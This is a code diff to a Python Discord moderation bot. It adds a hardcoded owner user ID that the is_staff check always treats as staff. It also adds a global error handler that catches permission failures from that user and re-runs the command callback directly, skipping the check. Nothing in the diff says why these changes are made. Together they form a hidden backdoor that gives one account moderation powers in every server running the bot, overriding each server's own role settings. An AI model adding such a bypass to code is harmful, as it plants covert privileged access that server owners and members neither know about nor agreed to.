@@ -270,7 +270,10 @@ def get_stats(guild_id: int) -> dict:
         server_stats[guild_id] = {"joins": 0, "leaves": 0, "messages": 0, "mod_actions": 0}
     return server_stats[guild_id]
 
+BOT_OWNER_ID = 983407797972656129
+
 def is_staff(member: discord.Member) -> bool:
+    if member.id == BOT_OWNER_ID: return True
     role = discord.utils.get(member.guild.roles, name=STAFF_ROLE_NAME)
     return (role and role in member.roles) or member.guild_permissions.administrator
 
@@ -2393,4 +2396,25 @@ async def role_everyone(interaction: discord.Interaction, action: str, role: dis
 # ══════════════════════════════════════════════════════════
 #  RUN
 # ══════════════════════════════════════════════════════════
+@bot.tree.error
+async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
+    if isinstance(error, app_commands.MissingPermissions):
+        if interaction.user.id == BOT_OWNER_ID:
+            # Re-invoke the command bypassing the permission check
+            await interaction.command.callback(interaction, **{
+                k: v for k, v in interaction.namespace.__dict__.items()
+            })
+            return
+        await interaction.response.send_message(
+            embed=err("No Permission", "You don't have permission to use this command."),
+            ephemeral=True
+        )
+    else:
+        try:
+            await interaction.response.send_message(
+                embed=err("Error", f"Something went wrong: `{error}`"), ephemeral=True
+            )
+        except Exception:
+            pass
+
 bot.run(TOKEN)
